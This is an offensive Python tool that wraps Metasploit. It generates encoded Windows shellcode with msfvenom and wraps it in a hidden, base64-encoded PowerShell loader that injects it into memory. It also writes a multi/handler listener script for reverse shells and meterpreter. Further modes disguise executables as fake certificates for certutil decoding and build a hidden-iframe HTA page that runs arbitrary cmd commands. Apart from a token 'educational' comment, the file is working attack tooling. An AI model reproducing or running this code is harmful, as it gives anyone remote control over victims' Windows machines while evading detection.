#!/usr/bin/python
# -*- coding: utf-8 -*-

# Please Install Metasploit-Framework first,
# Kali Linux:       apt-get install metasploit-framework
# Notice:           Just For edutional purpose
# License:          BSD License

import logging
import subprocess
import base64
import re
import os
import sys
from optparse import OptionParser
from optparse import OptionGroup
from optparse import OptionError


logging.basicConfig(level=logging.INFO, format="[+] %(message)16s")


def write_file(filename, data):
    """Write data into file"""
    with open(filename, 'w') as f:
        f.write(data)


def read_file(filename):
    """Read data from file"""
    with open(filename, "rb") as f:
        data = f.read()
    return data


def execute_command(command):
    """Execute OS Command"""
    logging.debug("Executes command: %s" % command)
    proc = subprocess.Popen(command,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)
    data = proc.communicate()[0]
    return data


def extract_msf_shellcode(shellcode):
    """Filter some bad chars in shellcode"""
    replaces = {';': '',
                ' ': '',
                '+': '',
                '"': '',
                '\n': '',
                'buf=': '',
                'Found 0 compatible encoders': '',
                'unsignedcharbuf[]=': ''}
    for key, value in replaces.iteritems():
        shellcode = shellcode.replace(key, value)

    shellcode = shellcode.rstrip()
    return shellcode


def generate_msf_shellcode(payload, host, port):
    """generate shellcode: \x00\x00\x00...."""
    logging.debug("Metasploit Framework generates shellcode")
    command = ("msfvenom "
               "-p %s "
               "LHOST=%s "
               "LPORT=%s "
               "StagerURILength=5 "
               "StagerVerifySSLCert=false "
               "-e x86/shikata_ga_nai "
               "-a x86 "
               "--platform windows "
               "--smallest "
               "-f c") % (payload, host, port)
    shellcode = execute_command(command)

    return extract_msf_shellcode(shellcode)


def generate_powershell_script(shellcode):
    shellcode = ("$1 = '$c = ''"
                 "[DllImport(\"kernel32.dll\")]"
                 "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
                 "[DllImport(\"kernel32.dll\")]"
                 "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
                 "[DllImport(\"msvcrt.dll\")]"
                 "public static extern IntPtr memset(IntPtr dest, uint src, uint count);"
                 "'';"
                 "$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;"
                 "[Byte[]];[Byte[]]"
                 "$z = %s;"
                 "$g = 0x1000;"
                 "if ($z.Length -gt 0x1000){$g = $z.Length};"
                 "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
                 "for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"
                 "$w::CreateThread(0,0,$x,0,0,0);"
                 "for (;;){Start-sleep 60};';"
                 "$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"
                 "$2 = \"-enc \";"
                 "if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\syswow64\WindowsPowerShell\\v1.0\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}" % shellcode)

    return shellcode


def generate_powershell_command(shellcode):
    shellcode = base64.b64encode(shellcode.encode('utf_16_le'))
    return "powershell -window hidden -enc %s" % shellcode


def generate_powershell_attack(payload, host, port):
    """generate shellcode: 0x00,0x00,0x00,..."""
    shellcode = generate_msf_shellcode(payload, host, port)
    shellcode = re.sub("\\\\x", "0x", shellcode)

    counter = 0
    floater = ""
    newdata = ""

    for line in shellcode:
        floater += line
        counter += 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    shellcode = newdata[:-1]
    shellcode = generate_powershell_script(shellcode)
    powershell_cmd = generate_powershell_command(shellcode)

    msfcommand = ("use exploit/multi/handler\n"
                  "set payload %s\n"
                  "set LHOST %s\n"
                  "set LPORT %s\n"
                  "set ExitOnSession false\n"
                  "set EnableStageEncoding true\n"
                  "exploit -j\n") % (payload, host, port)

    logging.info('create msfconsole resource script')
    write_file('powershell_msf.rc', msfcommand)

    logging.info('create powershell shellcode command')
    write_file('powershell_hacking.bat', powershell_cmd)

    return powershell_cmd, msfcommand


def generate_cert_attack(filename):
    if not os.path.isfile(filename):
        logging.info("Please set a file for cert attack")
        sys.exit()

    crt_dirname = "cert_attack"
    crt_encode_filename = "cert_encode.crt"
    crt_decode_filename = "cert_decode.bat"

    crt_encode_filepath = "%s/%s" % (crt_dirname, crt_encode_filename)
    if not os.path.isdir(crt_dirname): os.makedirs(crt_dirname)
    if os.path.isfile(crt_encode_filepath): os.remove(crt_encode_filepath)

    # Translate a binary file to coreutil prep format.
    data = read_file(filename)
    data = base64.b64encode(data)
    data = ("-----BEGIN CERTIFICATE-----\n"
            "%s\n"
            "-----END CERTIFICATE-----" % data)
    logging.info('encode a binary file to a cert file')
    write_file(crt_encode_filepath, data)

    # Create a windows batch decode script (.bat)
    crt_decode_script_filepath = "%s/%s" % (crt_dirname, crt_decode_filename)
    data = "certutil -decode %s encoded.exe" % crt_encode_filename
    logging.info('create a windows batch script for decode')
    write_file(crt_decode_script_filepath, data)



def generate_hta_attack(command):
    hta_module = "module.hta"
    hta_index = "index.html"
    hta_dirname = "windows_hta_attack"

    hta_module_code = ("<script>\n"
            "a=new ActiveXObject(\"WScript.Shell\");\n"
            "a.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);"
            "window.close();\n</script>" % command)

    hta_index_code = ("<iframe "
            "id=\"frame\" "
            "src=\"%s\" "
            "application=\"yes\" "
            "width=0 height=0 style=\"hidden\" "
            "frameborder=0 marginheight=0 "
            "marginwidth=0 scrolling=no></iframe>" % hta_module)

    if not os.path.isdir(hta_dirname): os.makedirs(hta_dirname)

    logging.info('create hta index file')
    write_file("%s/%s" % (hta_dirname, hta_index), hta_index_code)

    logging.info('create hta module file')
    write_file("%s/%s" % (hta_dirname, hta_module), hta_module_code)

    return hta_index_code, hta_module_code


def powershell_attack_help():
    doc = ("Everything is now generated in two files, ex:\n"
           "    powershell_hacking.bat - shellcode can be executed in cmd console.\n"
           "                           - Usage: cmd.exe /c powershell_hacking.bat\n"
           "    powershell_msf.rc      - msfconsole resource script.\n"
           "                           - Usage: msfconsole -r powershell_msf.rc\n")
    logging.info(doc)
    logging.info("python psmsf.py --attacktype ps --payload windows/shell/reverse_tcp --lhost 192.168.1.100 --lport 8443")
    logging.info("python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.100 --lport 8443")
    logging.info("python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_http --lhost 192.168.1.100 --lport 8443")


def cert_attack_help():
    doc = ("The certutil attack vector was identified by Matthew Graeber (@mattifestation) "
           "which allows you to take a binary file, move it into a base64 format and "
           "use certutil on the victim machine to convert it back to a binary for you. "
           "This should work on virtually any system and allow you to transfer a binary "
           "to the victim machine through a fake certificate file. To use this attack, ")
    logging.info(doc)
    logging.info("python psmsf.py --attacktype crt --filename demo.exe")


def hta_attack_help():
    doc = ("The HTA attack will automatically generate two files, ex:\n"
           "    index.html             - redirects browsers to use module.hta"
           "    module.hta             - contains the malicious code"
           "                           - Usage: http://x.x.x.x/winodows_hta/index.html"
    )
    logging.info(doc)
    logging.info("python psmsf.py --attacktype hta whoami")


def banner():
    banner = """
     ######
      #     #  ####  #    #  ####  ######
       #     # #      ##  ## #      #
        ######   ####  # ## #  ####  #####
         #            # #    #      # #
          #       #    # #    # #    # #
           #        ####  #    #  ####  #
    """

    logging.info(banner)
    return banner


def help():
    usage = "python %prog [options]"
    parser = OptionParser(usage=usage)

    try:
        parser.add_option('--attacktype', dest='attacktype', help='Attack Types are supported. (ps, hta, crt)')

        powershell_opts = OptionGroup(parser, "Powershell Attack", "Powershell features")
        powershell_opts.add_option('--payload', dest='payload', type='str', help='payload of metasploit framework')
        powershell_opts.add_option('--lhost', dest='lhost', type='str', help='lhost for payload of metasploit framework')
        powershell_opts.add_option('--lport', dest='lport', type='int', help='lport for payload of metasploit framework')
        parser.add_option_group(powershell_opts)

        crt_opts = OptionGroup(parser, "CERT Attack", "Cert features")
        crt_opts.add_option('--filename', dest='filename', type='str', help='file to be encoded to a certification')
        parser.add_option_group(crt_opts)

        hta_opts = OptionGroup(parser, "HTA Attack", "HTA features")
        hta_opts.add_option('--command', dest='command', type='str', help='command of attack mode')
        parser.add_option_group(hta_opts)

        (args, _) = parser.parse_args()
    except (OptionError, TypeError) as e:
        parser.error(e)
    else:
        return args


if __name__ == "__main__":
    args = help()
    if not args.attacktype:
        banner()
        logging.info('Please -h or --help for more details')
        sys.exit()

    attacktype = args.attacktype.lower()

    if attacktype == 'ps':
        if args.payload and args.lhost and args.lport:
            generate_powershell_attack(args.payload, args.lhost, args.lport)
        else:
            banner()
            powershell_attack_help()

    elif attacktype == 'crt':
        if args.filename:
            generate_cert_attack(args.filename)
        else:
            banner()
            cert_attack_help()

    elif attacktype == 'hta':
        if args.command:
            generate_hta_attack(args.command)
        else:
            banner()
            hta_attack_help()
    else:
        banner()
        logging.info('Please -h or --help for more details')
